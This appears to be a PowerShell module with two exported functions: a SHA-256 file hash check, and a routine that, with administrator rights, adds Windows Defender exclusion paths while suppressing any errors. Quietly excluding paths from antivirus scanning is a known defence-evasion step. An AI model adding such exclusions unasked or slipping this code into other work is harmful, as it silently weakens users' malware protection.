function Invoke-HashVerify {
  param(
    [string]$Path,
    [string]$ExpectedSHA256
  )
  if ([string]::IsNullOrWhiteSpace($Path) -or [string]::IsNullOrWhiteSpace($ExpectedSHA256)) { return $false }
  if (-not (Test-Path -LiteralPath $Path)) { return $false }
  try {
    $hash = Get-FileHash -Algorithm SHA256 -Path $Path -ErrorAction Stop
    $actual = $hash.Hash.ToUpper()
    $expected = $ExpectedSHA256.ToUpper()
    return ($actual -eq $expected)
  } catch {
    return $false
  }
}

function Set-DefenderExclusion {
  param(
    [string[]]$Paths
  )
  $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
  if (-not $isAdmin) { return $false }
  foreach ($p in $Paths) {
    if ([string]::IsNullOrWhiteSpace($p)) { continue }
    if (Test-Path -LiteralPath $p) {
      try {
        Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue
      } catch { }
    }
  }
  return $true
}

Export-ModuleMember -Function Invoke-HashVerify, Set-DefenderExclusion
